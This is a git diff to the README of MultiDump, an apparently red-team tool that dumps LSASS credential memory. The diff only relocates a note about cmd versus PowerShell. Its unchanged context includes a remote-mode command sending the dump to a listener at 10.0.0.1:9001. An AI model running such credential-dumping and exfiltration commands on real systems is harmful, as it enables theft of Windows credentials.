@@ -74,6 +74,8 @@ MultiDump.exe
 
 If `--procdump` is used, `ProcDump.exe` will be writtern to disk to dump LSASS.
 
+In cmd, `--procdump` _must_ be used, or it will fail per [#5](https://github.com/Xre0uS/MultiDump/issues/5), recommend to always use powerhsell if possible.
+
 In remote mode, MultiDump connects to the handler's listener.
 
 ```bash
@@ -84,8 +86,6 @@ In remote mode, MultiDump connects to the handler's listener.
 ```powershell
 MultiDump.exe -r 10.0.0.1:9001
 ```
-
-In cmd, `--procdump` _must_ be used, or it will fail per [#5](https://github.com/Xre0uS/MultiDump/issues/5), recommend to always use powerhsell if possible.
 
 The key is encrypted with the handler's IP and port. When MultiDump connects through a proxy, the handler should use the `--override-ip` option to manually specify the IP address for key generation in remote mode, ensuring decryption works correctly by matching the decryption IP with the expected IP set in MultiDump `-r`.
 
